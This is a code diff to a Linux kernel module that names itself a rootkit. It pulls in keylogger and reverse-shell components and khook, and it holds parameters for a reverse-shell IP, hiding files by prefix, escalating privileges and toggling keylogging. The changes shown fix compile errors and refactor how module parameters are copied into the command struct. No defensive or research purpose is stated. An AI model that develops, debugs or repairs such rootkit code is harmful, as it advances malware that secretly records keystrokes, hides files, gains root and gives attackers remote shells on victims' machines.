@@ -9,7 +9,7 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/timer.h>
-#include <string.h>
+// #include <include/linux/string.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -34,7 +34,7 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
-struct commands {
+typedef struct commands {
     // TODO: Add properties for each of the commands we can accept
     char* rev_shell_ip;
     char* hidden_file_prefix;
@@ -76,17 +76,19 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  */
 
 static void poll_for_commands(unsigned long data);
+// static void copy_params_into_cmd_struct(commands* cmd);
 
 /**
  * Logging Helpers
+ * // TODO: Fix
  */
 
 void log_info(const char* message) {
-    printk(KERN_INFO "GARDEN: %s", message);
+    printk(KERN_INFO "%s %s", "GARDEN:", message);
 }
 
 void log_error(const char* message) {
-    printk(KERN_ERROR "GARDEN: %s", message);
+    printk(KERN_ERR "GARDEN: %s", message);
 }
 
 // TODO: Figure out if this is needed at all.
@@ -193,11 +195,11 @@ static void poll_for_commands(unsigned long data) {
     set_timer(&polling_timer);
 }
 
-static void copy_params_into_cmds() {
-    cmds.rev_shell_ip = rev_shell_ip;
-    cmds.hidden_file_prefix = hidden_file_prefix;
-    cmds.escalate_privs = escalate_privileges;
-    cmds.keylogger = keylogger;
+static void copy_params_into_cmd_struct(commands* cmd) {
+    cmd->rev_shell_ip = rev_shell_ip;
+    cmd->hidden_file_prefix = hidden_file_prefix;
+    cmd->escalate_privs = escalate_privileges;
+    cmd->keylogger = keylogger;
 }
 
 /**
@@ -208,7 +210,7 @@ static int __init rootkit_init(void) {
     khook_init();
 
     printk(KERN_INFO "Reading parameters...\n");
-    cmds = copy_params_into_cmds();
+    copy_params_into_cmd_struct(&cmds);
 
     printk(KERN_INFO "Initializing timer...\n");
     timer_init_wrapper(&polling_timer, poll_for_commands);
